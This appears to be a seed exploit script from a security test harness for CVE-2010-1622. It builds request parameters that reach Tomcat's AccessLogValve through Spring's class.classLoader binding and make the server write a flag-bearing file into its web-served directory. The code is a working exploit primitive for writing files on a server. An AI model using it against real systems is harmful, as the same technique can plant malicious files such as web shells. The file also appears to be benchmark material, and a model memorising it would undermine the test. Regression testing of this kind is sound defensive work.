#!/usr/bin/env python3
"""[GIVEN] CVE-2010-1622 seed exploit -- class.classLoader data-binding path.

Spring MVC data binding traverses Object.getClass().getClassLoader() and all
its nested properties. On Tomcat, this reaches the AccessLogValve via:

  class.classLoader.resources.context.parent.pipeline.first.*

By setting the AccessLogValve's pattern to the PCB_FLAG token, suffix to .txt,
and directory/prefix to write into the web-served directory, a benign marker
file is written proving the classLoader binding was reachable.

Contract:
  - Reaches flag on V0 (Spring 3.0.2.RELEASE, no property blocklist).
  - BLOCKED on V1 (Spring 5.3.17, CVE-2010-1622 blocklist filters class.classLoader).
"""
from __future__ import annotations


# The AccessLogValve property binding via class.classLoader (no module hop).
# This is the ORIGINAL path that CVE-2010-1622 demonstrated and that the
# 2010 fix blocked by adding classLoader to the CachedIntrospectionResults
# property-descriptor blocklist.
PREFIX = "class.classLoader.resources.context.parent.pipeline.first"
MARKER_FILE = "pcb_original"


def candidate(flag: str = "FLAG_PLACEHOLDER") -> dict:
    """The request candidate for the CVE-2010-1622 seed.

    The params reconfigure Tomcat's AccessLogValve to write a benign text
    file containing the flag token into the webapp's served directory.
    """
    return {
        "probe_id": "cve-2010-1622-classloader-binding",
        "method": "GET",
        "params": {
            f"{PREFIX}.pattern": flag,
            f"{PREFIX}.suffix": ".txt",
            f"{PREFIX}.directory": "webapps/ROOT",
            f"{PREFIX}.prefix": MARKER_FILE,
            f"{PREFIX}.fileDateFormat": "",
            f"{PREFIX}.buffered": "false",
        },
        "marker_path": f"/{MARKER_FILE}.txt",
    }


if __name__ == "__main__":
    import json
    import os
    flag = (
        os.environ.get("RUN_FLAG_REF")
        or os.environ.get("PCB_FLAG")
        or os.environ.get("RUN_FLAG")
        or "FLAG_PLACEHOLDER"
    )
    print(json.dumps(candidate(flag), indent=2))
